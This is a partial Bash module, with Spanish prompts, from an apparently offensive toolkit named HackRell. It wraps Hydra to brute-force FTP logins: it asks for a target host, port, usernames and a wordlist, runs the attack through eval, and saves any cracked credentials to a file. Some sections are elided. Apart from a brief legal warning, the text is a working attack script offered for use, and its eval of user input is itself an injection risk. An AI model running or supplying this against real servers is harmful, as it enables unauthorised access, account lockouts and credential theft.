...
# HackRell - brute/brute_ftp.sh
# Realiza ataques de fuerza bruta a servicios FTP.
...
function brute_ftp_menu() {
    check_root
    display_legal_warning
    clear
    print_banner "MÓDULO DE FUERZA BRUTA FTP"
    echo ""
    print_info "Este módulo realiza ataques de fuerza bruta a servicios FTP."
    print_warning "Los ataques de fuerza bruta pueden bloquear cuentas o IPs. Úselo solo en objetivos autorizados."
    echo ""

    read -p "${C_GREEN}Ingrese la IP o hostname del objetivo FTP: ${C_RESET}" target_host
    read -p "${C_GREEN}Ingrese el puerto FTP (por defecto 21): ${C_RESET}" target_port
    ...
    print_info "Iniciando ataque de fuerza bruta FTP con Hydra..."
    print_info "Objetivo: $target_host:$target_port"
    print_info "Usuario(s): $username_input"
    print_info "Diccionario: $wordlist_file"
    print_info "Los resultados se guardarán en ${LOG_DIR}/brute_ftp.log"
    echo ""

    local hydra_command_prefix="hydra -V -f -o ${LOG_DIR}/brute_ftp_found.txt"
    local hydra_target_options="ftp://$target_host:$target_port"
    ...
    eval "$hydra_command" 2>&1 | tee -a "$LOG_DIR/brute_ftp.log"

    if [ -s "${LOG_DIR}/brute_ftp_found.txt" ]; then
        print_success "¡Credenciales FTP encontradas! Verifique ${LOG_DIR}/brute_ftp_found.txt"
    else
        print_warning "No se encontraron credenciales FTP con el diccionario proporcionado."
    fi
